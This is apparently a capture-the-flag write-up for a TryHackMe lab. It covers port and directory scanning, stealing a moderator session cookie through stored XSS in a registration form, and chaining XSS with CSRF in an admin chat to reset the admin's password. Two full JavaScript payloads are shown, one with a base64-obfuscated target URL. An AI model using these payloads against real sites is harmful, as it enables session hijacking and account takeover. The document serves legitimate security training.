<blockquote>
<b>WHATS YOUR NAME</b><br>
</blockquote>

<blockquote>
<b>Recon</b><br><br>
  - First add 'worldwap.thm' and 'login.worldwap.thm' in '/etc/hosts' file.<br>
  - Then I ran a namp scan to see available ports with:<br>
  <pre>
    sudo nmap -sC -sV -vv 10.49.128.121
  </pre>
  - Three ports are open:<br>
  <br><img width="1066" alt="image" src="https://github.com/user-attachments/assets/cd55ff6e-d584-46eb-9a78-cab483940e3c" /><br>
  - Upon visiting 'http://worldwap.thm:80/' we are redirected to 'http://worldwap.thm/public/html' page:<br>
  <br><img width="1467" alt="image" src="https://github.com/user-attachments/assets/1c7d26aa-3794-4e19-880b-bc7659988703" /><br>
  
</blockquote>
<blockquote>
<b>Accessing Moderator Account:via XSS</b><br><br>
  - We can see a 'register' option right there:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/ca4e03d9-c3c0-4c25-867d-3f29adfb9e44" /><br>
  - When we tap the 'register' we can see something interesting:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/f0034c15-89bf-4f90-a4f4-0d0df4f1194d" /><br>
  - It means moderator will load whatever information we put in the registration form.So we might be able to steal moderator's cookie if XSS is possible.<br>
  - Let's try to register a dummy account and see if XSS is possible.There is a length-limitaion on 'Username' field so I put the payload in 'Email':<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/47e5eab1-b943-47b0-91e9-c4350d36e545" /><br>
  - After setting up a listener on port 1234 we submit our information and wait for any connection.After sometime we can see a connection is received:<br>
  <br><img width="1078" alt="image" src="https://github.com/user-attachments/assets/d5cbb146-b12f-40b5-8185-f26f18e5e418" /><br>
  - After completing registration we are told to visit 'login.worldwap.thm' to log in:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/12513807-1a26-47e1-8c8c-24a7ce41d750" /><br>
  - But 'http://login.worldwap.thm/' page is blank.So I ran gobuster to find hidden directories and files on that page with this command:
  <pre>
    gobuster dir -u http://login.worldwap.thm/ -w /usr/share/wordlists/dirb/big.txt -x .php,.js,.py,.txt
  </pre>
  - We can see 'login.php' in the result:<br>
  <br><img width="1337" alt="image" src="https://github.com/user-attachments/assets/b9acb9f3-37bd-4d30-8496-d6eebaf503d1" /><br>
  - We can now go to 'login.worldwap.thm/login.php' page which we just discovered,then save this cookie in our browser and refresh the page:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/93f657df-49e5-4fff-a49b-dd2a9c5b2c91" /><br>
  - And we are logged in as Moderator.Here we get our first flag:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/881a16c3-b75a-43e3-873e-3efe5d82c40d" /><br>

</blockquote>
<blockquote>
<b>Accessing Admin Panel:by chaining XSS and CSRF</b><br><br>
  - After exploring the moderators profile we can see two interesting option 'Change Password' and 'Go to Chat':<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/a5e4e923-7ec6-4594-94a2-7f8230d06a36" /><br>
  - Let's try to change moderator's password.We get an error:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/dcc566aa-4a15-4cc3-b3c0-da69a5c13fe7" /><br>
  - Now let's go to chat.Here we can directly chat with Admin.Let's check if XSS is possible here by sending a javascript payload:<br>
  <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/a6e8eeaa-2eba-426c-a420-cbf97e445396" /><br>
  - This is a stored XSS.Everytime the Admin will load our chat page the payload will be executed.<br>
  - What if we make Admin to change his password via XSS attack.Will that work?<br>
  - First let's carefully examine that change_password request to see what parameters are being used.We can see it's a POST request to '/change_password.php' with the parameter 'new_password' carrying our input:<br>
  <br><img width="878" alt="image" src="https://github.com/user-attachments/assets/33ad1d71-eec6-4572-a69a-b74bba885506" /><br>
  - So we have to create a XSS payload that will execute CSRF(Cross Site Request Forgery) and change the Admin's password to something that we can choose.That way we can then log in using that password.<br>
  - After doing some research I found a payload that was mentioned in CSRF room on TryHackMe.<br>
  <br><img width="1268" alt="image" src="https://github.com/user-attachments/assets/75dbc603-892c-46a8-ba4b-db0bcec6f27d" /><br>
  - Here's the payload we have to use to change the password to 'password':

```javascript
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://login.worldwap.thm/change_password.php', true);
    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    alert("Action executed!");
    }
    };
    xhr.send('action=execute&new_password=password');
    </script>

```
<br>
 - First we do 'clear all chats' to clear previous payloads.<br>
 - Then I send the payload.But the 'Action executed' popup doesn't appear.<br>
 <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/6817df66-c296-4be9-9150-204c0b0b7064" /><br>
 - Maybe there is some issue with how our url is being processed.So let's encode the url to base64 first:<br>
 <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/40c82a4d-6a1a-4c50-a7eb-65a910d9fcac" /><br>
 - And then inside our payload use atob() to decode it:

```javascript
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    alert("Action executed!");
    }
    };
    xhr.send('action=execute&new_password=password');
    </script>

```
<br>
 - Now let's clear all chats and send the modified payload again.This time we get a 'Action executed' popup:<br>
 <br><img width="1469" alt="image" src="https://github.com/user-attachments/assets/314f703f-aa5f-43ce-9dca-5a4abbbafbb9" /><br>
 - Now we can login as admin on 'http://login.worldwap.thm/login.php' using username=admin and password=password.After logging in we get the second flag:<br>
 (NOTE:We have to clear all cookies before we try to login as admin.Otherwise the moderator's stolen cookie that we saved in our browser will keep logging us in as moderator)<br>
 <br><img width="1470" alt="image" src="https://github.com/user-attachments/assets/b9d4bac2-64a0-479b-875d-fbb442f99260" /><br>
 <br><img width="1468" alt="image" src="https://github.com/user-attachments/assets/e553ec68-b7f6-4032-917c-202130571f46" /><br>

</blockquote>
